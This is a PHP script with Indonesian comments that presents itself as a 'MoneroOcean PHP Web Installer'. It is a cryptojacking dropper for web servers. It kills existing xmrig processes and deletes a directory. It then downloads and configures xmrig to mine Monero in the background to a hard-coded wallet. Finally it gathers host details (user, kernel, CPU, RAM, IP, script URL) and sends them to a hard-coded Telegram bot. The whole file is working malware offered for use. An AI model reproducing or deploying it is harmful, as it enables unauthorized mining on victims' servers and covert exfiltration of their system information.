<?php

error_reporting(E_ALL);
ini_set('display_errors', 1);
set_time_limit(0);

function flush_output($msg) {
    echo $msg . str_repeat(' ', 1024) . "<br>\n";
    @ob_flush();
    @flush();
}

function sendTelegram($token, $chat_id, $message) {
    $url = "https://api.telegram.org/bot{$token}/sendMessage";
    $post = [
        'chat_id' => $chat_id,
        'text' => $message,
        'parse_mode' => 'HTML',
        'disable_web_page_preview' => true
    ];

    $ch = curl_init();
    curl_setopt_array($ch, [
        CURLOPT_URL => $url,
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_POST => true,
        CURLOPT_POSTFIELDS => $post,
        CURLOPT_TIMEOUT => 10,
    ]);
    curl_exec($ch);
    curl_close($ch);
}

flush_output("== MoneroOcean PHP Web Installer ==");

$wallet = "48wk97EaXFA9Q6gTuDWu5oKLFEpPCARoyLjnJ9snWnk5LzJ2BVNrDnDBKyY8oZmYvRQ4G1D1f4AuhVhdRWYh65ud3RnpThi";
$BASE_DIR = __DIR__ . "/wpp";
$telegram_token  = "7718242724:AAHmR3eFxah3juQcpkS_AnybzsOBU3OuIPw";
$telegram_chatid = "5104210301";

flush_output("[*] Wallet: $wallet");
flush_output("[*] Lokasi instalasi: $BASE_DIR");

# === Cek curl/wget ===
$dl_cmd = null;
if (shell_exec("command -v curl")) {
    $dl_cmd = "curl -L -o";
    flush_output("[*] Menggunakan curl");
} elseif (shell_exec("command -v wget")) {
    $dl_cmd = "wget -O";
    flush_output("[*] Menggunakan wget");
} else {
    flush_output("[x] ERROR: curl dan wget tidak ditemukan!");
    exit;
}

# === Hapus versi lama ===
flush_output("[*] Membersihkan instalasi lama...");
shell_exec("pkill xmrig 2>/dev/null");
shell_exec("rm -rf '$BASE_DIR'");
mkdir($BASE_DIR, 0755, true);

# === Unduh xmrig ===
$xmrig_url = "https://raw.githubusercontent.com/MoneroOcean/xmrig_setup/master/xmrig.tar.gz";
$xmrig_tar = "$BASE_DIR/xmrig.tar.gz";

flush_output("[*] Mengunduh xmrig...");
shell_exec("$dl_cmd '$xmrig_tar' '$xmrig_url' 2>&1");

if (!file_exists($xmrig_tar)) {
    flush_output("[x] ERROR: Gagal mengunduh xmrig!");
    exit;
}

# === Ekstrak ===
flush_output("[*] Mengekstrak xmrig...");
shell_exec("tar -xf '$xmrig_tar' -C '$BASE_DIR'");
unlink($xmrig_tar);

# === Edit config.json ===
$config_file = "$BASE_DIR/config.json";
if (!file_exists($config_file)) {
    flush_output("[x] ERROR: config.json tidak ditemukan setelah ekstrak!");
    exit;
}

$config = file_get_contents($config_file);
$config = preg_replace('/"user":\s*"[^"]*"/', '"user": "'.$wallet.'"', $config);
$config = preg_replace('/"url":\s*"[^"]*"/', '"url": "gulf.moneroocean.stream:10128"', $config);
$config = preg_replace('/"pass":\s*"[^"]*"/', '"pass": "php-web"', $config);
$config = preg_replace('/"background":\s*false/', '"background": true', $config);
file_put_contents($config_file, $config);

# === Jalankan miner ===
flush_output("[*] Menjalankan miner di background...");
shell_exec("cd '$BASE_DIR' && nohup ./xmrig --config=config.json >/dev/null 2>&1 &");

# === Ambil info sistem untuk Telegram ===
$whoami       = trim(shell_exec("whoami"));
$uname_info   = trim(shell_exec("uname -a"));
$ram_info     = trim(shell_exec("free -h | grep Mem | awk '{print \$2 \" (used: \" \$3 \", free: \" \$4 \")\"}'"));
$cpu_cores    = trim(shell_exec("lscpu | grep '^CPU(s):' | awk '{print \$2 \" cores\"}'"));
$cpu_threads  = trim(shell_exec("lscpu | grep '^Thread(s) per core:' | awk '{print \$4 \" threads/core\"}'"));
$ip_info      = trim(shell_exec("hostname -I | awk '{print \$1}'"));
$hostname     = trim(shell_exec("hostname"));
$xmrig_pid    = explode("\n", trim(shell_exec("pgrep xmrig")));
$current_url  = (isset($_SERVER['HTTPS']) ? "https" : "http") . "://{$_SERVER['HTTP_HOST']}{$_SERVER['REQUEST_URI']}";

$message = "✅ <b>XMRig dijalankan sukses</b>\n"
         . "🖥️ <b>Hostname</b>: <code>$hostname</code>\n"
         . "🧠 <b>CPU</b>: $cpu_cores\n"
         . "🧪 <b>Threads/Core</b>: $cpu_threads\n"
         . "📦 <b>RAM</b>: $ram_info\n"
         . "👤 <b>User</b>: $whoami\n"
         . "🌐 <b>IP</b>: $ip_info\n"
         . "🔧 <b>System</b>: <code>$uname_info</code>\n\n"
         . "⛏️ <b>Process ID</b>:\n<code>" . implode("\n", $xmrig_pid) . "</code>\n\n"
         . "🔗 <b>Script URL</b>: <a href=\"$current_url\">Open Script</a>";

sendTelegram($telegram_token, $telegram_chatid, $message);

flush_output("[✓] Selesai! Miner sedang berjalan di background.");
flush_output("📨 Notifikasi telah dikirim ke Telegram.");
